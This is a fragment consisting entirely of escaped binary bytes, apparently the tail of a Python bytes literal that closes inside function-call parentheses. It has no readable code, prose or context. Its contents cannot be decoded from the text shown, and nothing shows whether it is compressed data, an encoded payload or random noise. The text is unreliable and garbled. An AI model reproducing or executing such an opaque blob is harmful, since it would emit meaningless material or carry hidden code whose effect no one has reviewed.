\xc3\xdf\x9d\x8a&\x14\xf6\xc4`2\x9e*\xa4\x05U*n\x98\xb1\xe6W#}\xcc,\t\xac\\\x870#\xe1\xb7\xdf\x80\xea@\xfbYG\xe4\xdf\xb0a/\x9f\x13\xf9\x06\x08\xfc\xb6\xba\xfd*\xe1\x02\x00\xbe\xd99i\xc1)^\x18V\xb9\x8d\x9b\x08\x1c\xd8\xbe\xcf\xa4BW!\x08\t\x86dD\t\x05\xc8\x1d\xa29\xc7\x92@\xd7\xab\x1dc\x86\x168(<\x14\xedc(\xfd@\xfa\x80\xc2\xc6l@7\x06\x1f\x1d\xfea\x18f\xe5n\xa6l\xb2\x96\x8d\xd3\x08\x84\xe2$\x8e\xc3L\xe8\x82\xa0\x13T\xa5@\xa2\xd8\xe3\xda{\xbb\xd7\xa7\x15\xb5\'m\x86\xd4zz\xb2u\xc1\'\x10@\xe0\x05\xb0\x8f\xf9\xa3"\x9b\xff)\xa7\x00\xdc\xfea\x15`\xdb\x01\r\x8c\xe0^\x8fP\xde\xf4\x7fC\xd3\xd9\x15eY%\xfb3\x82\xff_\xe0\x81p\'-\xa2\xed\xf3s\x0cr\xb3x\xad\x86q2rrY\x04\xf2b\x18c\xf9\xdc\xd8{\xc1\xcf-\xda\xee[Q\xe2\xa0\xf33\xe7\xb57b\xf8@ J&\x14\x8f\x95F\x0cK\x1a\x84\x0b\xe4\xc8\xdf\xa4\x00\xcb\xf6\xbe}\x82\xfd\xf8\xc3"\x11\xc5`\x0e\xa0\x1ePx`\x08p1;8L\xc0\xa0\x85+h\xff\xa92\x12\xc6\x0f\x8c\x08\xf0h6{\xdd0\xaf\xbb\x1b\x81 \xda3\xaa\xfe\xb5\xa2\x002DCt\xf0\xf1GL#\xa1^#\x87}\xc9\xa6\xdc\xc4\xf0\xd8\x0e\xf9s"\x08\x82Y S/\x8d\xb0_\xa3\xc9\xbb\xb9vf3\xc4?a\x9dJ%j\xd4\xcdOdJ*o\xa2<\xb0\x11\xbf\xa3\xf0\n\xe8\xd9>\x93AwN\xae\xac\xcfz\xfcV\x18\x8fd\x80`g\x89~\xd6\xff\xc61\xe5<C\xea\x03\xc8\x97\x93@H,\xda\xce]\x0f\x83}/\x14|\xf4\x97"\xf5\x9b\xe3\x9c\x01\xc7\xc5C<\xccK\xe5\x95E\xeb\x93y9\xb9\xe9\x9b\xa7<5x\xdc\xd1\xb2t\'\xfe\xd2v\xab)m\xc6\x0f\x04|\x01#\'\x15D\x81\x06\xbb\x13\x14\x96|\xd1ba\xb3\xb1\xe9-\xf8\xa4\xe1\xcc\xccO\xe7\xc3-\xc1\xc7\x99K\xc4\xc3\x06\x03\r@\x87\xb8\x1f\xf0\xc5d\xfa2\xc7\xad\xe3\xa5\x8cI\xf0\x14"\xc0\xa2\x1c\xc9\xfe\xbe7\xf0\xf6\x1a\xc5\x97&\x89^}\xa5\xa7\xcc\xa1\xe9\x80K\xc6D\xcc\x1f\xd0\x81a%%B\xdfb;\x94b\xd1^\xd8X;O}\x8c\x1d\xf4\x850W\xea\x10\xf6\x9c\x1d\x1e\xa2\xd6\x9a\x8d\x9f\x18`W\xe7\x1c\xc3\xffI[*\x9ba\xc6\xa3E\xe4\x122R\x9e\xe0\xf2}%\xec\x95\x91_(\xb7\x19\xa6\x1c\x03\x0c\xc3\xfa\x00jA\xa4\x05+\x02\xed\xc5Y\xd9\xef\xc3\xee|p\xda\xdf\x18*KW\xe4l\x03\xe9\x1a!\xcc1O\x87\xbc\x84\xd3\x05T\x0edx?\x03\x02\xf8\xbcUX\x80\xad\x90W\xdd\xde\ta\xcf\xee\xce\xc9\x0f\x0cJ\x00k\xc1[\x01\xbfG\x9a\xe1P\x17P\x02\xc1\xb8\xf1\xfb\xf5\xe8\xbb\x1dS\x07\xb5\xf6\xea\xb3\x07\xa6\xdc\xc2:\x16\x17\x82\r=\xb3 \xf0\x98\x86Q\xd8\x14\xef\xb3\xff.\xbc\x96\x00\xf9\x05,"x^`\xa1\x8c\x8e_\xf47v\x04\xfd\xe6l\x13\xf4\x8aE\x03\xf1\x86\xf4\x07\xb4[\x9d\xda\'\xda\xb0\xc8\xfa\xbf\x00\xdaTC~\x9d\x91\xb6\x0fr\xc3\x04<\x84z\x08\x7f\xb6\x8f\xa1\xba\xdb\xaa\t\x00\x1d\xb1fS\xc9\x06!\x92\xd3\xf8=.n\xda\x8dm\x87\xcf\xa9\x9f\x15\xad\'lh\xd8g\xedF\x17\xeeHm\xb5\xe2\xda\xe9\xe6\x0c \xcal\xf1G\xb9/{q\xa2\x125\xe5\xa2\xaf\xa708\xaf\x0fxe4\n\x97y\x83\xfe\xc1\x83m\xbbhh\x95\xe5\xd0!\xe68\'\xdc\xae\xbe\x0c+\x18\x96\x08NaT\x0b\x0ca\x0b\xa0+\xf2\x9bu\x0c&\x0b\xb1\x80>\xc5\xb3\xf1\xf5\xc8\xc1a\x93\xa0WS67Y\xf3\x15sw5Pf7\xeb\xb0\xfa\xc9\x17z\xe17\xf8\xe1\xfb\xfd\xdd7\xa8\xa1\x0b\xa0?ZC[\x8e\xf5MM\x9dp\x83\xf1a\\\xbfFW\x92\x08\x87\x88pT\xb6\xa8s{\xc2\xe6\xf2\xc1\x0c\x08GRp\x86@`E\xa3\x1b\xd85H>\xcb\xd9t\x9f\x0e<\x94\xc1fY\xa6\xd4\xb9\xca\xf0\x07\xb4\xd1*3)q\x92<\x0b\x18\x8d\xe1\x15\xc6G]\xa4\xbc\x80\x0e,\x8cg\x83f>\\C\xdb\xbe\x8e\xf7/\xba\x1cF\xeb\xa4v\x00\xa0\x072]\xc7l\x7fU\x9f\x8bx\x9b\x0evU\x05f\xc4\xfe\xbc\x18\xfbE+\xaf\x0e~Ka\xc2\x9bL\xd9\xa1\xd2r\xf8\x03\xf8X\xec\xce\x92P\xbe\x18\xf0\x1d\x08\xa5\xa5$\x81j\xc5\xbf\x1d|{?\xf7\xd6=\xf6\xcan\xc5\x86~\x04"\xdc\x92\xb0l\x88\xdc\xd9\x0c\x18 \x85\x00\x80\xbdq@\x17`\xa8X\xff\xe5\xf7\'\xf2\xeah\xad\xd6R\xe0\x9a\xefl\x8fswxF\xa1\xb0\xd9\xfe\x00\xc6B V\xc9F\x9e\xf5\xea[JE\x02"K\n\xfaj}\xeb\xd3\xff\xab\xa2\x99\xfd\xf5if\xe9\xf9\x03\xfa\x055\xb6\x7f\x9f>\xbf\xe5\xc5\x08\xb4h\xe4\x96m\xaf\xa8\xad\xbc9l\x05\x84\x06\x0b\x1b\x0c\xc46L\xd0\xf8\x8b\x85S\x06&>\x96t\xb3\xdf\x8c\xed\xee\xcf\x85\x948\x91\xc7\xe3\x7f\x13\xc2:\xb2,\n\xc8\xb4\xd2\x18\xdbS\xc7\xba\xb1\x0f\x97f\x94f\xc4=\xb7\x99=_\x9c\x0c\xd8~_^a\xceH\xba=\x99\xf0%\xb0\x9fU\x84<\x7f\xf3\x04\xf9\xb8\xb1\xfb\x05\xfca$\xe6\xe7\xd4\x8b\xb4\xfd\x18\x13|}\xab\xb5\x11\x0c\xe7{\x06e\xb9\xe0+\xc0\x1bb\x01\x98\xdbk\x19\x87\xf4\x96\x07\xff<\x1f\xc1\x97P\x1a\x1f\x90\xc5f\xc4\xee\xd8_\xe0\x9f\xcd\xa00\xea\xe4E8\xbf\x10\xc6\xa1\xd7\xf8\xbb\xf9a\x84*\xef\x82\x8c\nB\xc1wv\x08\xf5\xd4\xe2\xc2\xd0P0\x11h~\x11\xe2\xe0\x0c&\xdc\xab\x9e\xe1\x8d\xf9u\xa8\x0f\xe6\x07\xfbc\xbf\xdd\xa3O\xcd\xf0\'\x8f.\xcc)\xf0`\xbe\x01\xeb\x1e\xcaU\x9bf5\xfa\x1d0\\%W\xe0\x17\rk\xc4\x03\xb0h\x1c\xf8\xfe\x11\xe8\xe8v\xb8R,\t5\xad\xbde\x8e\x86\x14Z;as8\x16\x0b\xd0:\xe7\xacC\x97\xc07g\x85\xc8l\xc7o\xbc5\xe2\xa2\x11\xfd\xcd\xcc4\x7f\xeb\xd7W\x80\x96Y+\x08A`y\xaf\x04W\xfb\xb5\xfay\x18\x03X\xe0i\xb1\x0c\xceE\x03\xee\x88\xdd0\x86p\xf3\x07\xc6cV\x82\xb9\xbb\x88r\x16[.\x08{\x17751\x82>\xeb\x1a0\xf0\x11\xe6\xa5\xd8eT\xf6\n\xd0(\xe1\x9c\xd1\xc7\xb0\xf1\xf5\x0f\x9d\xff\xc5\x07\x8brm\x11\xdd\xa10\x89\x11\xc7\xcft\xb56\x1cx/0 \x0b\t\xa4\x00\xc3\x14R(j\xb0\xb4I\x02k6d\xcf\xba\xf7\xfb\x8e,c\r\xfe+\x08\xf8\xff$\x01K\xffJ5\xc3\xc2\xd50O~\x02\xcc\xdb \x16\xfa\xb8#\xe5\xf4d\x03\x10cM \x81\xd5\xc0\x82\xc0\xa3\x08\x90ksZ\xac;\xb3\xcd\xac\xe9\x84\xc3\xcf\x0fL\xa1\xc7fp\xcd\x8f\x1cs\xaa\xdb\xd8\xad\x84\xcf\xbc\xc2\x1b3H\x0fp\xca\xc5mV(\xb5\xd6\xeb\xb6\xac\x0b\xb0\x96]~\x11xY\x83%\x91\xea+_m\xb1z\x99\xde\xd9\xa3\x03\xf03\xfe\xb5\xa2\xc4M\xb6Z\x93\x00z<\\]\xdeE\xe1\xc2\xc8\x83\x93\xbce\x01\xca\xc0\x9fm\xf9\x83\x1fn%\x81\xfb\xc7\xda\x7f\n\xf7\xb3_x\x95\'\x81\x8e\x11\xd0\xd0\x8a\xb0\x12c\xc7-\x10-\x88\xd1`\x81\xa9\xcf2\xa0\xdd?\x1b\n\xcd\xc1\xfe\x15!p\xa5\xe0<S\xec\x0ev\x10r\x98\x96\xb6f\xd9k\x0c\xd0\x91\xfb\xba\xf6_Y?\xee\x86\x11\xbb\x0f`.\x1e\xf4\xd6\xfd-\xbe10\xd3\xc1\'\xb7\x9d\xedM\xdb\xe9\xd7\x13\x80\xc3t\xdfH\xb1\\\x05\xe563\x81\xbd\xc2\x90\xf0\xb6+\x9a,l\x95\x81_/\x00\x945\x0c"\xd6\xc0\x9aO\x0c\xcb\xb9y\x89\xb7y\xb7\x81\xde\xb0\xf9\xcc\xf7\xca\'\xf8\xf3`/\xc7?\xaf\x9e\x18\xc3>\x8a\xd5\x8dU\x8aa\x85\x86\x0f\n\x9ekj\x1c\xb7\x8d\x98\x1c\xa7\x08\xfb\xb2\xf2\xf0\x0f\xed\xbb\r3\x8d\\\x0b\xf8$s3\xd9\x81\xe0\xe4k\x13}\x9c\xe7\xf6u\xc3\x83\x8c\xd9[\xbaX\xab\xb4A\xba.WP\xc1\xc0\xfd\xde\xfb"\xadX\x91\xe0\xae\xc3\x02\xc2\xd70\xdb\xde\x1f|\\\xc9\x83x~cMR{\xb2\xfc\xcb\xd2\xcdH9?\x1di\x99\x99\xde\x18\x0f\xfc\x0e\xc2\x15~\xeb\x85\x9b\xb6\xba\xb3\xa7\xfd\xd7v>\xbdznZ[\x12\xea\xc2\xd5\xbbw\x91i\xec\x05\xf6\x0f\xdb\xe4\xb5uVl\x8d\xbe\xed\x86?m\x81\xb2A\xf8VY\xc68\xd8[0\xb8\xdan\x91^\xd8V[\x15\xd3{cQKo\xbd.Y\xb6\x1b\xe7S\xb7M-\x84\xf9e\xee\xab\xc5\x82#\xe6\xaa\x8eXo\xb0\x8c\xda\x1e\xf6\x1e\xe0"\r\x9cOVh\xc2Z(\x8c\x05\xcalO\xf7\t\xe3\xef\x081\xfd\x9e\xbd\xdf\xb3\xeb\x1e\xe8\xb5}\xddi\xecJ\x9fm\xce\xaa}\xbc\xed\xbe\xea\xffw\x8eUO{\xaf\xb6!^\xb6o\xe2\x08\xfd\xb23|x\x19\xb5"\xa8\xf7}x\xcf\xfd{m\x8d\x8bm\x9b\xbe\x16\x91V\x9f\xb1\x19\xac\xeb\x07\xd9z\xe4\xbf\x0b\xfd\xd5}\xb0\x8a\xf6\xe4Z+mz\x18\x94r\xc2\xc5\xb4\xa9i\x96.\xd1\xe8\xcb#\xdb\x98k\x9eV\xc8\xc65o)\xaa\xbd\xb2\xf5\xf8\xcb\x7f\xdd\xff\xf7d\xac*o\x83\x18\x96\xcc\xbb\xf7O\xfa\x9e\xf7m\xf4\xe8\xb8\x18^\xceUi\xb40}\xd6\xfb\xff\x81\xfb\x1f\x10\xea\xda]m\xcf\xa9\xfb\xb2\xcd\xf7U\x02n\x81\xf7b\xe2\xc55_\xbbm\xafw\xd6\xbd\xd4~\xef\xd7\xb9\xf1~\x15,\xb1\xad\x1fw\x8f\x83\xffu\xae\x98B\xad\xdbs\xfb\xb7\x8cF\xf7\\\xf8p&\xfd\xd9N\x9b\xaf})\xefw\xd5\xbd\xd0O\xf7y\x9emJ\x1fu\xedM\x95\xde\x1c{\xdd\x06w\xba\xa9\xfe\xec\xbfu\xd1hz\xfb?\xba\xaeo`\xe6\r\x95_\xbb\x97.\xb2=\x81\xa3\xee\xf2\xf1*\xffw,\xdf\xfft\x90~\xed7=\xd0\\{\xdd\x13\xee\xed\xca\x1f\xc4\xbfw\xce7\x85B\xfb\xba<+\r\xfft\xdd>\xee\xba}\xdc\xfe\xecO\x02\xdb7\xdd\x87\xee\x8e\xf0h\xdfuV\x9e\xed\x9c"\xeb\xbd\x96O\xbb\x0eKOu\x96~\xea }\xdc<a\xe7\xee\xbb]\xef8\xda< \xeb\xbd\xc5W~\xee\xba\xefs\xfa\x9b\xae\xf7\xcf\xba\xf7\x1d\xec&\x8b\xf7m\xcf\xe2\x1b\xfe\xde\xf6\xbb\xdfC\xae\xf4\xd0U\xd7{O\xcc\xba\xefa\xea\xd1\xb1\xfd\xd1\xd1\xebn\xbd\xb1\x9e\xea\xea\xea\xee\x84\xee\xdd\xc2\t\xe1\xfb\xe9\xd7Un\xfe\xdf\x81TG\x08\xa2\x08\xd3qO\x10A \xc8\x98\x03\x01gy\xb8"\n\x08\xf8+\xfc\x13M\x14Cg]M\x9cx'))

